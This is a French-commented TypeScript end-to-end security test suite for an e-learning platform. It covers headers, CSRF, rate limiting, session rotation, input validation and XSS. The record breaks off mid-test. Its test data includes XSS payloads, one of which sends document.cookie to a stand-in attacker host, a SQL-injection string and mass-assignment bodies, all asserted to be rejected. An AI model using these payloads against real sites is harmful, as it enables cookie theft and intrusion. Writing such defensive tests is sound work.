/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import fs from 'fs';
import path from 'path';
import http from 'http';
import crypto from 'crypto';
import net, { type AddressInfo } from 'net';
import { eq, and, gte, like } from 'drizzle-orm';
import { createApiApp } from '../server.ts';
import { db, createPool } from '../src/db/index.ts';
import {
  DEFAULT_TENANT_ID,
  users,
  studentProfiles,
  classes,
  sessions,
  enrollments,
  payments,
  subscriptions,
  notifications,
  userNotificationPreferences,
  emailQueue,
  integrationSettings,
  auditLogs,
  activeSessions,
  authRateLimits,
  passwordResetTokensTable,
  uploadedFiles,
  chargilyCheckouts,
  paymentWebhookEvents,
  installmentPlans,
  installmentItems,
  paymentReminders,
  invoices,
} from '../src/db/schema.ts';
import { hashPassword, hashLegacyPbkdf2, isArgon2idHash } from '../server/db.ts';
import {
  computeChargilySignature,
  getChargilyResolvedConfig,
} from '../server/billing.ts';
import {
  dispatchTransactionalNotification,
  processEmailQueueBatch,
} from '../server/emailService.ts';
import {
  MAX_ACCOUNT_LOGIN_ATTEMPTS,
  MAX_IP_LOGIN_ATTEMPTS,
} from '../server/auth.ts';
import { PRIVATE_UPLOADS_DIR } from '../server/uploads.ts';
import { runAutomatedTestSuite } from '../server/testRunner.ts';
import {
  ensureWesternDigits,
  formatDzd,
  formatNumber,
  formatPercent,
  formatDate,
  formatDateTime,
  formatTime,
} from '../src/i18n/format.ts';

function assert(condition: unknown, message: string): asserts condition {
  if (!condition) {
    throw new Error(`ASSERTION FAILED: ${message}`);
  }
}

interface HttpSessionJar {
  cookieHeader: string;
  rawSetCookies: string[];
  csrfToken: string;
}

function extractSetCookies(res: Response): string[] {
  const anyHeaders = res.headers as any;
  if (typeof anyHeaders.getSetCookie === 'function') {
    return anyHeaders.getSetCookie();
  }
  const single = res.headers.get('set-cookie');
  return single ? [single] : [];
}

function buildCookieJarFromSetCookies(
  setCookies: string[],
  previousCookies: Record<string, string> = {}
): Record<string, string> {
  const map: Record<string, string> = { ...previousCookies };
  for (const raw of setCookies) {
    const firstPart = raw.split(';')[0] || '';
    const eqIdx = firstPart.indexOf('=');
    if (eqIdx > 0) {
      const name = firstPart.slice(0, eqIdx).trim();
      const val = firstPart.slice(eqIdx + 1).trim();
      if (!val) {
        delete map[name];
      } else {
        map[name] = val;
      }
    }
  }
  return map;
}

function serializeCookieMap(map: Record<string, string>): string {
  return Object.entries(map)
    .map(([k, v]) => `${k}=${v}`)
    .join('; ');
}

async function runHttpNonRegressionSuite() {
  console.log('===================================================================');
  console.log('1. SUITE POSTGRESQL, TRANSACTIONS ACID & SÉCURITÉ (26 CAS MÉTIER)');
  console.log('===================================================================');

  const unitSuite = await runAutomatedTestSuite();
  for (const r of unitSuite.results) {
    console.log(`  [${r.passed ? 'PASS' : 'FAIL'}] #${r.id} ${r.name} (${r.durationMs}ms)`);
    if (!r.passed) {
      console.error(`         -> ${r.details}`);
    }
  }
  assert(
    unitSuite.success,
    `La suite PostgreSQL & Sécurité a échoué (${unitSuite.totalPassed}/${unitSuite.totalTests}).`
  );

  console.log('\n===================================================================');
  console.log('2. TESTS HTTP END-TO-END : 6 PILIERS D AUTHENTIFICATION & NON-RÉGRESSION');
  console.log('===================================================================');

  const testApp = createApiApp();
  const server = http.createServer(testApp);
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const { port } = server.address() as AddressInfo;
  const rootUrl = `http://127.0.0.1:${port}`;
  const baseUrl = `${rootUrl}/api`;

  const testStartIso = new Date().toISOString();
  const cleanupUserIds: string[] = [];
  const cleanupRateKeys: string[] = [];
  const cleanupPaymentIds: string[] = [];
  const cleanupNotificationIds: string[] = [];
  const cleanupUploadIds: string[] = [];
  const cleanupUploadDiskPaths: string[] = [];
  const cleanupCheckoutIds: string[] = [];
  const cleanupWebhookEventIds: string[] = [];
  const cleanupInstallmentPlanIds: string[] = [];
  const cleanupSubscriptionIds: string[] = [];
  const cleanupSessionIds: string[] = [];
  const cleanupEnrollmentIds: string[] = [];
  let createdPaymentId: string | null = null;
  let createdSubscriptionId: string | null = null;

  async function apiCall(
    endpoint: string,
    options: RequestInit = {},
    jar?: HttpSessionJar
  ): Promise<{
    status: number;
    body: any;
    text: string;
    headers: Headers;
    setCookies: string[];
  }> {
    const method = (options.method || 'GET').toUpperCase();
    const headers: Record<string, string> = {
      ...(options.headers as Record<string, string>),
    };
    if (options.body && !(options.body instanceof FormData) && !headers['Content-Type']) {
      headers['Content-Type'] = 'application/json';
    }
    if (jar?.cookieHeader && !headers['Cookie']) {
      headers['Cookie'] = jar.cookieHeader;
    }
    if (
      jar?.csrfToken &&
      ['POST', 'PUT', 'PATCH', 'DELETE'].includes(method) &&
      headers['X-CSRF-Token'] === undefined
    ) {
      headers['X-CSRF-Token'] = jar.csrfToken;
    }

    const res = await fetch(`${baseUrl}${endpoint}`, { ...options, method, headers });
    const text = await res.text();
    let body: any = null;
    try {
      body = JSON.parse(text);
    } catch {
      body = text;
    }
    const setCookies = extractSetCookies(res);
    if (jar) {
      if (setCookies.length > 0) {
        const currentMap: Record<string, string> = {};
        for (const pair of jar.cookieHeader.split(';')) {
          const idx = pair.indexOf('=');
          if (idx > 0) {
            currentMap[pair.slice(0, idx).trim()] = pair.slice(idx + 1).trim();
          }
        }
        const nextMap = buildCookieJarFromSetCookies(setCookies, currentMap);
        jar.cookieHeader = serializeCookieMap(nextMap);
        jar.rawSetCookies = setCookies;
      }
      const rotatedCsrf = res.headers.get('x-csrf-token');
      if (rotatedCsrf) {
        jar.csrfToken = rotatedCsrf;
      }
    }

    return { status: res.status, body, text, headers: res.headers, setCookies };
  }

  async function loginAs(
    email: string,
    password: string,
    expectedRole?: string,
    ipOverride: string = '127.0.0.1'
  ): Promise<{ res: Awaited<ReturnType<typeof apiCall>>; jar: HttpSessionJar }> {
    const res = await apiCall('/auth/login', {
      method: 'POST',
      headers: { 'X-Forwarded-For': ipOverride },
      body: JSON.stringify({ email, password, expectedRole }),
    });
    const cookieMap = buildCookieJarFromSetCookies(res.setCookies);
    const jar: HttpSessionJar = {
      cookieHeader: serializeCookieMap(cookieMap),
      rawSetCookies: res.setCookies,
      csrfToken: res.body?.csrfToken || res.headers.get('x-csrf-token') || '',
    };
    return { res, jar };
  }

  try {
    // -------------------------------------------------------------------------
    // PILIER (6) : EN-TÊTES DE SÉCURITÉ HELMET & POLITIQUE CORS RESTREINTE
    // -------------------------------------------------------------------------
    const health = await apiCall('/health', {
      headers: { Origin: 'http://localhost:3000' },
    });
    assert(health.status === 200 && health.body.status === 'ok', 'GET /api/health doit répondre 200');
    assert(
      health.headers.get('x-content-type-options') === 'nosniff',
      'Helmet X-Content-Type-Options: nosniff requis'
    );
    assert(
      Boolean(health.headers.get('content-security-policy')),
      'Helmet Content-Security-Policy requis'
    );
    assert(
      Boolean(health.headers.get('strict-transport-security')),
      'Helmet Strict-Transport-Security requis'
    );
    assert(
      health.headers.get('referrer-policy') === 'strict-origin-when-cross-origin',
      'Helmet Referrer-Policy requis'
    );
    assert(
      health.headers.get('x-powered-by') === null,
      'X-Powered-By doit être supprimé'
    );
    assert(
      health.headers.get('access-control-allow-origin') === 'http://localhost:3000' &&
        health.headers.get('access-control-allow-credentials') === 'true',
      'CORS autorise explicitement http://localhost:3000 avec credentials'
    );

    const evilCors = await apiCall('/courses', {
      headers: { Origin: 'https://evil-attacker.example.com' },
    });
    assert(
      evilCors.status === 403 &&
        evilCors.body.error === 'CORS_ORIGIN_FORBIDDEN' &&
        evilCors.headers.get('access-control-allow-origin') === null,
      'CORS rejette https://evil-attacker.example.com avec HTTP 403'
    );
    console.log('  [PASS] Pilier (6) : En-têtes Helmet (CSP, HSTS, nosniff, Referrer-Policy) & CORS restreint');

    // -------------------------------------------------------------------------
    // PILIER (1) : ARGON2ID + MIGRATION TRANSPARENTE DEPUIS PBKDF2 À LA CONNEXION
    // -------------------------------------------------------------------------
    const migUserId = `usr_mig_${crypto.randomUUID()}`;
    const migEmail = `migration.pbkdf2.${Date.now()}@etu.najahlearn.dz`;
    const legacyPbkdf2Hash = hashLegacyPbkdf2('SecretHistorique2026!');
    assert(!isArgon2idHash(legacyPbkdf2Hash), 'Le hash initial est un PBKDF2 hexadécimal');

    await db.insert(users).values({
      id: migUserId,
      uid: migUserId,
      name: 'Étudiant Migration PBKDF2',
      email: migEmail,
      role: 'STUDENT',
      status: 'ACTIVE',
      passwordHash: legacyPbkdf2Hash,
      createdAt: testStartIso,
      updatedAt: testStartIso,
    });
    cleanupUserIds.push(migUserId);

    const firstLogin = await loginAs(migEmail, 'SecretHistorique2026!', 'STUDENT', '192.0.2.10');
    assert(firstLogin.res.status === 200, 'Connexion réussie avec un ancien hash PBKDF2');

    const [migratedRow] = await db.select().from(users).where(eq(users.id, migUserId)).limit(1);
    assert(
      migratedRow &&
        isArgon2idHash(migratedRow.passwordHash) &&
        migratedRow.passwordHash !== legacyPbkdf2Hash,
      'Le hash PBKDF2 a été migré de manière transparente vers $argon2id$ dans PostgreSQL'
    );

    const secondLogin = await loginAs(migEmail, 'SecretHistorique2026!', 'STUDENT', '192.0.2.10');
    assert(secondLogin.res.status === 200, 'La reconnexion ultérieure fonctionne sur le nouveau hash Argon2id');
    console.log('  [PASS] Pilier (1) : Hachage Argon2id & migration transparente des hashes PBKDF2 à la connexion');

    // -------------------------------------------------------------------------
    // PILIER (2) : COOKIES HTTPONLY + SECURE + SAMESITE=STRICT & PROTECTION CSRF
    // -------------------------------------------------------------------------
    const sessionCookieHeader = firstLogin.res.setCookies.find((c) =>
      c.startsWith('najahlearn_session=')
    );
    assert(Boolean(sessionCookieHeader), 'Set-Cookie najahlearn_session émis à la connexion');
    assert(/;\s*HttpOnly/i.test(sessionCookieHeader!), 'Attribut HttpOnly présent sur najahlearn_session');
    assert(/;\s*Secure/i.test(sessionCookieHeader!), 'Attribut Secure présent sur najahlearn_session');
    assert(
      /;\s*SameSite=Strict/i.test(sessionCookieHeader!),
      'Attribut SameSite=Strict présent sur najahlearn_session'
    );
    assert(
      firstLogin.res.body.token === undefined &&
        firstLogin.res.body.session?.token === '[HTTPONLY_COOKIE]',
      'Aucun jeton de session brut exposé dans le corps JSON'
    );

    // Tentative de mutation SANS X-CSRF-Token (avec cookie valide) -> 403 CSRF_TOKEN_INVALID
    const csrfMissingRes = await fetch(`${baseUrl}/auth/logout`, {
      method: 'POST',
      headers: {
        Cookie: secondLogin.jar.cookieHeader,
        'Content-Type': 'application/json',
      },
    });
    const csrfMissingBody = await csrfMissingRes.json();
    assert(
      csrfMissingRes.status === 403 && csrfMissingBody.error === 'CSRF_TOKEN_INVALID',
      'Requête POST sans X-CSRF-Token bloquée avec HTTP 403 CSRF_TOKEN_INVALID'
    );

    // Tentative de mutation avec FAUX X-CSRF-Token -> 403 CSRF_TOKEN_INVALID
    const csrfForgedRes = await fetch(`${baseUrl}/auth/logout`, {
      method: 'POST',
      headers: {
        Cookie: secondLogin.jar.cookieHeader,
        'X-CSRF-Token': 'csrf_forged_invalid_token_value',
        'Content-Type': 'application/json',
      },
    });
    assert(csrfForgedRes.status === 403, 'Requête POST avec faux X-CSRF-Token bloquée avec HTTP 403');
    console.log('  [PASS] Pilier (2) : Cookies HttpOnly + Secure + SameSite=Strict & blocage CSRF 403');

    // -------------------------------------------------------------------------
    // PILIER (3) : RATE LIMITING PERSISTANT POSTGRESQL (PAR COMPTE & PAR IP)
    // -------------------------------------------------------------------------
    const rlAccountIp = `198.51.100.${Math.floor(Math.random() * 200) + 20}`;
    cleanupRateKeys.push(`account:${migEmail}`, `ip:${rlAccountIp}`);

    for (let i = 0; i < MAX_ACCOUNT_LOGIN_ATTEMPTS; i++) {
      const bad = await loginAs(migEmail, 'MauvaisMotDePasse!', 'STUDENT', rlAccountIp);
      assert(bad.res.status === 401, `Échec attendu #${i + 1}`);
    }

    // 6e tentative (même avec le BON mot de passe !) bloquée par verrouillage compte
    const lockedAcctAttempt = await loginAs(
      migEmail,
      'SecretHistorique2026!',
      'STUDENT',
      '192.0.2.99'
    );
    assert(
      lockedAcctAttempt.res.status === 429 &&
        lockedAcctAttempt.res.body.lockedBy === 'ACCOUNT' &&
        Boolean(lockedAcctAttempt.res.headers.get('retry-after')),
      'Compte verrouillé (HTTP 429 + Retry-After) après 5 échecs dans PostgreSQL'
    );

    const [persistedAcctLock] = await db
      .select()
      .from(authRateLimits)
      .where(eq(authRateLimits.key, `account:${migEmail}`))
      .limit(1);
    assert(
      Boolean(persistedAcctLock && persistedAcctLock.lockedUntil),
      'Verrouillage par compte persisté dans la table PostgreSQL auth_rate_limits'
    );
    await db.delete(authRateLimits).where(eq(authRateLimits.key, `account:${migEmail}`));

    // Rate limiting par IP (password spraying sur plusieurs comptes)
    const sprayIp = `203.0.113.${Math.floor(Math.random() * 200) + 20}`;
    cleanupRateKeys.push(`ip:${sprayIp}`);
    for (let i = 0; i < MAX_IP_LOGIN_ATTEMPTS; i++) {
      const target = `spray.target.${i}.${Date.now()}@etu.najahlearn.dz`;
      cleanupRateKeys.push(`account:${target}`);
      await loginAs(target, 'WrongPass!', 'STUDENT', sprayIp);
    }

    const lockedIpAttempt = await loginAs(
      'admin@najahlearn.dz',
      'Admin2026!',
      'ADMIN',
      sprayIp
    );
    assert(
      lockedIpAttempt.res.status === 429 && lockedIpAttempt.res.body.lockedBy === 'IP',
      'Adresse IP verrouillée (HTTP 429 lockedBy=IP) après 12 échecs distribués'
    );
    console.log('  [PASS] Pilier (3) : Rate limiting persistant PostgreSQL par Compte (5 essais) & par IP (12 essais)');

    // -------------------------------------------------------------------------
    // PILIER (4) : POLITIQUE DE MOT DE PASSE ROBUSTE (RESET, CHANGE & CRÉATION)
    // -------------------------------------------------------------------------
    const forgotRes = await apiCall('/auth/forgot-password', {
      method: 'POST',
      headers: { 'X-Forwarded-For': '192.0.2.55' },
      body: JSON.stringify({ email: migEmail }),
    });
    cleanupRateKeys.push('reset_ip:192.0.2.55');
    assert(forgotRes.status === 200 && forgotRes.body.testToken, 'Jeton de reset généré');

    const weakResetShort = await apiCall('/auth/reset-password', {
      method: 'POST',
      headers: { 'X-Forwarded-For': '192.0.2.55' },
      body: JSON.stringify({ token: forgotRes.body.testToken, newPassword: 'Short1!' }),
    });
    assert(
      weakResetShort.status === 400 && weakResetShort.body.error === 'WEAK_PASSWORD',
      'Rejet HTTP 400 d un mot de passe < 12 caractères'
    );

    const weakResetEmail = await apiCall('/auth/reset-password', {
      method: 'POST',
      headers: { 'X-Forwarded-For': '192.0.2.55' },
      body: JSON.stringify({
        token: forgotRes.body.testToken,
        newPassword: 'Migration#2026Securite!',
      }),
    });
    assert(
      weakResetEmail.status === 400 && weakResetEmail.body.error === 'WEAK_PASSWORD',
      'Rejet HTTP 400 d un mot de passe contenant l identifiant e-mail'
    );

    const strongReset = await apiCall('/auth/reset-password', {
      method: 'POST',
      headers: { 'X-Forwarded-For': '192.0.2.55' },
      body: JSON.stringify({
        token: forgotRes.body.testToken,
        newPassword: 'Blindage#Robuste9472!',
      }),
    });
    assert(strongReset.status === 200 && strongReset.body.success === true, 'Mot de passe robuste accepté');
    console.log('  [PASS] Pilier (4) : Politique de mot de passe robuste (12+ car., complexité, anti-contexte)');

    // -------------------------------------------------------------------------
    // PILIER (5) : EXPIRATION (IDLE + ABSOLUE) & ROTATION DES SESSIONS + ANTI-REJEU
    // -------------------------------------------------------------------------
    const rotLogin = await loginAs(migEmail, 'Blindage#Robuste9472!', 'STUDENT', '192.0.2.60');
    assert(rotLogin.res.status === 200, 'Connexion avec le nouveau mot de passe robuste');
    const oldCookieHeader = rotLogin.jar.cookieHeader;
    const oldCsrfToken = rotLogin.jar.csrfToken;

    // 5a. Rotation explicite via POST /api/auth/rotate-session
    const rotateRes = await apiCall('/auth/rotate-session', { method: 'POST' }, rotLogin.jar);
    assert(
      rotateRes.status === 200 &&
        rotLogin.jar.cookieHeader !== oldCookieHeader &&
        rotLogin.jar.csrfToken !== oldCsrfToken,
      'POST /api/auth/rotate-session émet un nouveau cookie HttpOnly et un nouveau X-CSRF-Token'
    );

    const meAfterRotate = await apiCall('/auth/me', {}, rotLogin.jar);
    assert(meAfterRotate.status === 200, 'Le nouveau cookie issu de la rotation est fonctionnel');

    // 5b. Détection de rejeu de l'ancien cookie tourné -> révocation immédiate de la session !
    const replayAttempt = await fetch(`${baseUrl}/auth/me`, {
      headers: { Cookie: oldCookieHeader },
    });
    const replayBody = await replayAttempt.json();
    assert(
      replayAttempt.status === 401 && replayBody.error === 'SESSION_COMPROMISED_ROTATED',
      'La réutilisation de l ancien jeton tourné déclenche 401 SESSION_COMPROMISED_ROTATED'
    );

    const revokedCheck = await apiCall('/auth/me', {}, rotLogin.jar);
    assert(
      revokedCheck.status === 401,
      'La session compromise a bien été révoquée suite au rejeu détecté'
    );

    // 5c. Rotation périodique automatique (> 15 min) & Expiration de session en base
    const expLogin = await loginAs(migEmail, 'Blindage#Robuste9472!', 'STUDENT', '192.0.2.61');
    const preAutoCookie = expLogin.jar.cookieHeader;
    const sessionId = expLogin.res.body.session.id as string;

    // Vieillir rotatedAt de 20 minutes pour déclencher la rotation périodique transparente
    await db
      .update(activeSessions)
      .set({ rotatedAt: new Date(Date.now() - 20 * 60 * 1000).toISOString() })
      .where(eq(activeSessions.id, sessionId));

    const autoRotMe = await apiCall('/auth/me', {}, expLogin.jar);
    assert(
      autoRotMe.status === 200 && expLogin.jar.cookieHeader !== preAutoCookie,
      'Rotation automatique transparente déclenchée après dépassement de l intervalle de 15 min'
    );

    // Forcer l'expiration d'inactivité (expiresAt dans le passé)
    await db
      .update(activeSessions)
      .set({ expiresAt: new Date(Date.now() - 60_000).toISOString() })
      .where(eq(activeSessions.id, sessionId));

    const expiredMe = await apiCall('/auth/me', {}, expLogin.jar);
    assert(
      expiredMe.status === 401 && expiredMe.body.error === 'SESSION_EXPIRED',
      'Session expirée rejetée avec HTTP 401 SESSION_EXPIRED'
    );
    console.log('  [PASS] Pilier (5) : Rotation explicite & automatique, détection de rejeu et expiration de session');

    // -------------------------------------------------------------------------
    // SUITE COMPLÈTE DE NON-RÉGRESSION DES ROUTES MÉTIER EXISTANTES
    // -------------------------------------------------------------------------
    const crsList = await apiCall('/courses');
    assert(crsList.status === 200 && crsList.body.courses.length >= 3, 'GET /api/courses >= 3 formations');
    const crsDetail = await apiCall('/courses/crs_web');
    assert(
      crsDetail.status === 200 &&
        crsDetail.body.course.id === 'crs_web' &&
        crsDetail.body.modules.length >= 2 &&
        crsDetail.body.modules[0].lessons.length >= 1,
      'GET /api/courses/crs_web retourne modules et leçons relationnelles'
    );

    const wrongRoleLogin = await loginAs('admin@najahlearn.dz', 'Admin2026!', 'STUDENT', '192.0.2.70');
    assert(wrongRoleLogin.res.status === 403 && wrongRoleLogin.res.body.error === 'ROLE_MISMATCH', 'ROLE_MISMATCH vérifié');

    const { res: adminLoginRes, jar: adminJar } = await loginAs(
      'admin@najahlearn.dz',
      'Admin2026!',
      'ADMIN',
      '192.0.2.71'
    );
    assert(adminLoginRes.status === 200 && adminJar.csrfToken, 'Connexion Admin par cookie réussie');

    const adminMe = await apiCall('/auth/me', {}, adminJar);
    assert(adminMe.status === 200 && adminMe.body.user.role === 'ADMIN', 'GET /api/auth/me Admin');
    const adminSessions = await apiCall('/auth/sessions', {}, adminJar);
    assert(adminSessions.status === 200 && adminSessions.body.sessions.length >= 1, 'GET /api/auth/sessions');

    const studentsRes = await apiCall('/students', {}, adminJar);
    assert(
      studentsRes.status === 200 &&
        studentsRes.body.students.length >= 10 &&
        !studentsRes.body.students[0].passwordHash,
      'GET /api/students sans passwordHash'
    );
    const classesRes = await apiCall('/classes', {}, adminJar);
    assert(classesRes.status === 200 && classesRes.body.classes.length >= 3, 'GET /api/classes');
    const statsRes = await apiCall('/dashboard/stats', {}, adminJar);
    assert(
      statsRes.status === 200 && typeof statsRes.body.collectedRevenueDzd === 'number',
      'GET /api/dashboard/stats'
    );
    const stuCsv = await apiCall('/students/export-csv', {}, adminJar);
    assert(stuCsv.status === 200 && stuCsv.text.includes('Identifiant,Nom Complet'), 'GET /api/students/export-csv');
    const payCsv = await apiCall('/payments/export-csv', {}, adminJar);
    assert(payCsv.status === 200 && payCsv.text.includes('N Recu,Etudiant'), 'GET /api/payments/export-csv');

    // Étudiant actif vs expiré + flux paiement transactionnel avec cookies + CSRF
    const { res: yacineRes, jar: yacineJar } = await loginAs(
      'yacine.brahimi@etu.najahlearn.dz',
      'Student2026!',
      'STUDENT',
      '192.0.2.72'
    );
    assert(yacineRes.status === 200, 'Connexion Yacine');
    const joinAllowed = await apiCall('/sessions/ses_live_1/join', {}, yacineJar);
    assert(joinAllowed.status === 200 && joinAllowed.body.canJoin === true, 'Étudiant abonné rejoint la séance');

    const { res: sofianeRes, jar: sofianeJar } = await loginAs(
      'sofiane.feghouli@etu.najahlearn.dz',
      'Student2026!',
      'STUDENT',
      '192.0.2.73'
    );
    assert(sofianeRes.status === 200, 'Connexion Sofiane');
    const joinBlocked = await apiCall('/sessions/ses_live_1/join', {}, sofianeJar);
    assert(joinBlocked.status === 403 && joinBlocked.body.canJoin === false, 'Étudiant expiré bloqué 403');

    const declarePay = await apiCall(
      '/payments',
      {
        method: 'POST',
        body: JSON.stringify({
          courseId: 'crs_cyber',
          amountDzd: 6500,
          paymentMethod: 'BARIDIMOB_CCP',
          transactionReference: 'BM-HTTP-E2E-COOKIE-CSRF',
        }),
      },
      yacineJar
    );
    assert(declarePay.status === 201 && declarePay.body.payment.status === 'PENDING', 'POST /api/payments 201');
    createdPaymentId = declarePay.body.payment.id;

    const studentConfirmAttempt = await apiCall(
      `/payments/${createdPaymentId}/confirm`,
      { method: 'POST', body: JSON.stringify({}) },
      yacineJar
    );
    assert(studentConfirmAttempt.status === 403, 'RBAC 403 étudiant sur confirmation paiement');

    const adminConfirm = await apiCall(
      `/payments/${createdPaymentId}/confirm`,
      { method: 'POST', body: JSON.stringify({ administrativeNotes: 'E2E Cookie+CSRF Confirm' }) },
      adminJar
    );
    assert(
      adminConfirm.status === 200 &&
        adminConfirm.body.payment.status === 'CONFIRMED' &&
        adminConfirm.body.payment.subscriptionId,
      'Validation transactionnelle paiement + activation abonnement via cookie + CSRF'
    );
    createdSubscriptionId = adminConfirm.body.payment.subscriptionId;

    const { res: teacherRes, jar: teacherJar } = await loginAs(
      'k.benali@najahlearn.dz',
      'Teacher2026!',
      'TEACHER',
      '192.0.2.74'
    );
    assert(teacherRes.status === 200, 'Connexion Enseignant');
    const rosterRes = await apiCall('/attendance/session/ses_past_1', {}, teacherJar);
    assert(rosterRes.status === 200 && Array.isArray(rosterRes.body.roster), 'GET /api/attendance/session/:id');

    const logoutRes = await apiCall('/auth/logout', { method: 'POST' }, teacherJar);
    assert(logoutRes.status === 200, 'POST /api/auth/logout avec X-CSRF-Token');
    const afterLogout = await apiCall('/auth/me', {}, teacherJar);
    assert(afterLogout.status === 401, 'Session révoquée et cookie effacé après logout');
    console.log('  [PASS] Non-régression complète de toutes les routes métier (Admin, Enseignant, Étudiant, Paiements ACID)');

    // =========================================================================
    // 3. SUITE AUTOMATISÉE DE TESTS D'ATTAQUE HTTP END-TO-END
    // =========================================================================
    console.log('\n===================================================================');
    console.log('3. SUITE D ATTAQUES AUTOMATISÉES : ZOD, XSS, IDOR, RBAC, CSV & UPLOADS');
    console.log('===================================================================');

    // Authentifier les acteurs distincts pour les scénarios d'attaque croisés :
    // - Student 1 : usr_stu_1 (yacine.brahimi@etu.najahlearn.dz) — déjà connecté dans yacineJar
    // - Student 2 : usr_stu_2 (amina.zerrouki@etu.najahlearn.dz) — attaquant horizontal étudiant
    // - Teacher 1 : usr_tch_1 (k.benali@najahlearn.dz) — propriétaire de cls_web_1 / ses_live_1 / ses_past_1
    // - Teacher 2 : usr_tch_2 (a.belkacem@najahlearn.dz) — affecté uniquement à cls_data_1 (attaquant horizontal enseignant)
    // - Manager   : usr_mgr_1 (gestion@najahlearn.dz) — gestionnaire administratif (test escalade verticale vers ADMIN)
    const { res: stu2Login, jar: stu2Jar } = await loginAs(
      'amina.zerrouki@etu.najahlearn.dz',
      'Student2026!',
      'STUDENT',
      '192.0.2.81'
    );
    assert(stu2Login.status === 200, 'Connexion Student 2 (Amina)');

    const { res: tch1Login, jar: tch1Jar } = await loginAs(
      'k.benali@najahlearn.dz',
      'Teacher2026!',
      'TEACHER',
      '192.0.2.82'
    );
    assert(tch1Login.status === 200, 'Connexion Teacher 1 (Karim)');

    const { res: tch2Login, jar: tch2Jar } = await loginAs(
      'a.belkacem@najahlearn.dz',
      'Teacher2026!',
      'TEACHER',
      '192.0.2.83'
    );
    assert(tch2Login.status === 200, 'Connexion Teacher 2 (Amel)');

    const { res: mgrLogin, jar: mgrJar } = await loginAs(
      'gestion@najahlearn.dz',
      'Manager2026!',
      undefined,
      '192.0.2.84'
    );
    assert(mgrLogin.status === 200 && mgrLogin.body.user.role === 'MANAGER', 'Connexion Manager');

    // -------------------------------------------------------------------------
    // ATTAQUE (A) : VALIDATION STRICTE ZOD (.strict()) SUR BODY, PARAMS & QUERY
    // -------------------------------------------------------------------------
    // A1. Mass-assignment sur POST /api/payments (injection status=CONFIRMED / confirmedBy)
    const massAssignPay = await apiCall(
      '/payments',
      {
        method: 'POST',
        body: JSON.stringify({
          courseId: 'crs_web',
          amountDzd: 6500,
          paymentMethod: 'CASH',
          status: 'CONFIRMED',
          confirmedBy: 'usr_admin_1',
        }),
      },
      yacineJar
    );
    assert(
      massAssignPay.status === 400 && massAssignPay.body.error === 'VALIDATION_ERROR',
      'Mass-assignment sur POST /api/payments rejeté par Zod .strict() (HTTP 400)'
    );

    // A2. Mass-assignment sur POST /api/auth/logout (injection de champs dans un body supposé vide)
    const unexpectedBodyOnEmptyPost = await apiCall(
      '/auth/rotate-session',
      {
        method: 'POST',
        body: JSON.stringify({ role: 'ADMIN', isAdmin: true }),
      },
      stu2Jar
    );
    assert(
      unexpectedBodyOnEmptyPost.status === 400 &&
        unexpectedBodyOnEmptyPost.body.error === 'VALIDATION_ERROR',
      'Champs imprévus sur POST sans body rejetés par Zod emptyBodySchema .strict() (HTTP 400)'
    );

    // A3. Paramètre query non autorisé sur GET /api/courses?__proto__=1&evilQuery=1
    const unexpectedQuery = await apiCall('/courses?evilParam=1');
    assert(
      unexpectedQuery.status === 400 && unexpectedQuery.body.error === 'VALIDATION_ERROR',
      'Paramètre query inconnu sur GET /api/courses rejeté par Zod .strict() (HTTP 400)'
    );

    // A4. Paramètre URL (:id) malformé avec injection SQL/traversée
    const badParamId = await apiCall('/courses/crs_web;DROP%20TABLE%20users--', {});
    assert(
      badParamId.status === 400 && badParamId.body.error === 'VALIDATION_ERROR',
      'Paramètre URL :id malformé rejeté par Zod idParamSchema (HTTP 400)'
    );

    // A5. Corps JSON syntaxiquement invalide -> 400 INVALID_JSON (sans stacktrace)
    const malformedJsonRes = await fetch(`${baseUrl}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{"email": "broken-json"',
    });
    const malformedJsonBody = await malformedJsonRes.json();
    assert(
      malformedJsonRes.status === 400 && malformedJsonBody.error === 'INVALID_JSON',
      'JSON malformé intercepté proprement avec HTTP 400 INVALID_JSON'
    );

    // A6. URI percent-encoding malformée -> 400 INVALID_URI + route API inconnue -> 404 API_ROUTE_NOT_FOUND
    const malformedUriRes = await fetch(`${rootUrl}/%E0%A4%A`);
    const malformedUriBody = await malformedUriRes.json();
    assert(
      malformedUriRes.status === 400 && malformedUriBody.error === 'INVALID_URI',
      'URI malformée interceptée proprement avec HTTP 400 INVALID_URI'
    );
    const unknownApiRes = await apiCall('/unknown-endpoint-probe', {}, yacineJar);
    assert(
      unknownApiRes.status === 404 && unknownApiRes.body.error === 'API_ROUTE_NOT_FOUND',
      'Route API inexistante interceptée en JSON avec HTTP 404 API_ROUTE_NOT_FOUND'
    );
    console.log('  [PASS] Attaque (A) : Validation stricte Zod (.strict()) sur body, params, query & anti-mass-assignment');

    // -------------------------------------------------------------------------
    // ATTAQUE (B) : PAYLOADS XSS MULTI-VECTEURS (BODY, QUERY, PARAMS, CSV)
    // -------------------------------------------------------------------------
    const xssPayloads = [
      '<script>fetch("https://attacker.tld?c="+document.cookie)</script>',
      '<img src=x onerror=alert(document.domain)>',
      'javascript:alert(1)',
      '<svg/onload=confirm(1)>',
    ];

    for (const payload of xssPayloads) {
      // B1. XSS dans création étudiant (Admin)
      const xssStu = await apiCall(
        '/students',
        {
          method: 'POST',
          body: JSON.stringify({
            name: payload,
            email: `xss.${Date.now()}@etu.najahlearn.dz`,
          }),
        },
        adminJar
      );
      assert(
        xssStu.status === 400 && xssStu.body.error === 'VALIDATION_ERROR',
        `Payload XSS bloqué sur POST /api/students : ${payload}`
      );

      // B2. XSS dans recherche query GET /api/students?query=...
      const xssSearch = await apiCall(
        `/students?query=${encodeURIComponent(payload)}`,
        {},
        adminJar
      );
      assert(
        xssSearch.status === 400 && xssSearch.body.error === 'VALIDATION_ERROR',
        `Payload XSS bloqué sur GET /api/students?query= : ${payload}`
      );

      // B3. XSS dans déclaration de paiement étudiant (référence / notes)
      const xssPayment = await apiCall(
        '/payments',
        {
          method: 'POST',
          body: JSON.stringify({
            courseId: 'crs_web',
            amountDzd: 6500,
            paymentMethod: 'BARIDIMOB_CCP',
            transactionReference: payload,
          }),
        },
        yacineJar
      );
      assert(
        xssPayment.status === 400 && xssPayment.body.error === 'VALIDATION_ERROR',
        `Payload XSS bloqué sur POST /api/payments : ${payload}`
      );
    }

    // B4. XSS dans commentaire d'émargement enseignant
    const xssAttendance = await apiCall(
      '/attendance/session/ses_past_1',
      {
        method: 'POST',
        body: JSON.stringify({
          entries: [
            {
